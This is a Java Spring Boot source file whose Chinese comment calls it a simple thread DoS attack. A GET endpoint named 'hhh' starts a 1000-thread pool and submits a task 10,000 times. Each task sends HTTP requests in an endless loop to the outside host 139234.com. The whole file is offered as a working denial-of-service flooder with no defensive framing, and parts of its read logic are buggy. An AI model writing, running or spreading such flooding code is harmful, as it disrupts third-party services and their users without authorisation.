package com.example.demo.servelt;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 简单的线程dos攻击
 */
@RestController
public class dos {
    @RequestMapping(value = "hhh",method = RequestMethod.GET)
    public static void hhh(){
        ExecutorService es = Executors.newFixedThreadPool(1000);
        Mythread mythread = new Mythread();
        Thread thread = new Thread(mythread);
        for(int i = 0;i<10000;i++){
            es.execute(thread);
        }
    }
}
class Mythread implements Runnable {

    public void run() {
        while(true){
            try {
                URL url = new URL("http://139234.com/");
                URLConnection conn = url.openConnection();
                System.out.println("请求成功");
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if(bis != null){
                    if((len = bis.read()) != -1){
                        sb.append(new String (bytes,0,len));
                        System.out.println("ok");
                        bis.close();
                    }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }
}
